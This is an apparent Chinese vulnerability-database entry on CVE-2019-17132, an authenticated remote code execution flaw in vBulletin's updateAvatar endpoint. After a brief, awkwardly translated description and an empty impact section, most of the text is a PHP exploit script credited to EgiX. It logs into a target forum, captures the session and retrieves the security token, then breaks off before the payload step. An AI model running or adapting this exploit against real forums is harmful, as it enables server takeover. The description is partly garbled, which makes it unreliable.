（CVE-2019-17132）vBulletin 5.0 \&lt;5.5.4-\&#x27;updateAvatar\&#x27;身份验证的远程代码执行漏洞¶
一、漏洞简介¶
用户输入更新头像的的时候，前未正确验证提交的&quot;数据[扩展]&quot;和&quot;数据[文件数据]&quot;参数就发送到了&quot; ajax / api / user / updateavatar&quot;，导致此突破的产生
利用此突破可以插入和执行任意php代码。
成功利用此突破需要&quot;将头像另存为Files（头像保存为文件）&quot;选项要启用（可选情况下少量）。
二、漏洞影响¶
三、复现过程¶
&lt;?php /* --------------------------------------------------------------------- vBulletin &lt;= 5.5.4 (updateAvatar) 远程代码执行漏洞 --------------------------------------------------------------------- */ set_time_limit(0); error_reporting(E_ERROR); if (!extension_loaded(&quot;curl&quot;)) die(&quot;[-] cURL extension required!
&quot;); print &quot;+-------------------------------------------------------------------------+&quot;; print &quot;
| vBulletin &lt;= 5.5.4 (updateAvatar) Remote Code Execution Exploit by EgiX |&quot;; print &quot;
+-------------------------------------------------------------------------+
&quot;; if ($argc != 4) { print &quot;
Usage......: php $argv[0] &lt;URL&gt; &lt;Username&gt; &lt;Password&gt;
&quot;; print &quot;
Example....: php $argv[0] http://localhost/vb/ user passwd&quot;; print &quot;
Example....: php $argv[0] [url]https://vbulletin.com/[/url] evil hacker

&quot;; die(); } list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]]; $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); print &quot;
[-] Logging in with username &#x27;{$user}&#x27; and password &#x27;{$pass}&#x27;
&quot;; curl_setopt($ch, CURLOPT_URL, $url); if (!preg_match(&quot;/Cookie: .*sessionhash=[^;]+/&quot;, curl_exec($ch), $sid)) die(&quot;[-] Session ID not found!
&quot;); curl_setopt($ch, CURLOPT_URL, &quot;{$url}?routestring=auth/login&quot;); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); curl_setopt($ch, CURLOPT_POSTFIELDS, &quot;username={$user}&amp;password={$pass}&quot;); if (!preg_match(&quot;/Cookie: .*sessionhash=[^;]+/&quot;, curl_exec($ch), $sid)) die(&quot;[-] Login failed!
&quot;); print &quot;[-] Logged-in! Retrieving security token...
&quot;; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); if (!preg_match(&#x27;/token&quot;: &quot;([^&quot;]+)&quot;/&#x27;, curl_exec($ch), $token)) die(&quot;[-] Security token not found!
